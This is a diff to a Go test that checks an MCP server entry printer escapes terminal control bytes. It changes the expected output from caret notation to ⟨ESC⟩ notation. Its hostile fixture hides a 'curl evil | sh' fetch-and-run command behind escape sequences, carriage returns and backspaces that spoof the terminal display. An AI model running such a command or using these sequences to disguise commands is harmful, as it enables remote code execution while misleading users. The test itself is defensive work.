@@ -23,10 +23,10 @@ var hostileMCPServer = operations.MCPServerEntry{
 
 func assertMCPFieldsEscaped(t *testing.T, out string) {
 	t.Helper()
-	assert.Contains(t, out, "helper^[[1A")
-	assert.Contains(t, out, "npx^M^[[2Kcurl evil | sh^H")
-	assert.Contains(t, out, "-y @acme/mcp^[[2K")
-	assert.Contains(t, out, "acme/tools^[[2K")
+	assert.Contains(t, out, "helper⟨ESC⟩[1A")
+	assert.Contains(t, out, "npx⟨U+000D⟩⟨ESC⟩[2Kcurl evil | sh⟨U+0008⟩")
+	assert.Contains(t, out, "-y @acme/mcp⟨ESC⟩[2K")
+	assert.Contains(t, out, "acme/tools⟨ESC⟩[2K")
 	assert.NotContains(t, out, "\x1b", "no raw ESC may reach the terminal")
 	assert.NotContains(t, out, "\r")
 	assert.NotContains(t, out, "\x08")
@@ -46,5 +46,5 @@ func TestPrintMCPServerEntry_ControlBytesAreEscaped(t *testing.T) {
 	printMCPServerEntry(&buf, hostileMCPServer)
 	out := buf.String()
 	assertMCPFieldsEscaped(t, out)
-	assert.Contains(t, out, "TOKEN^[[1A=secret^M", "env keys and values are both publisher bytes")
+	assert.Contains(t, out, "TOKEN⟨ESC⟩[1A=secret⟨U+000D⟩", "env keys and values are both publisher bytes")
 }
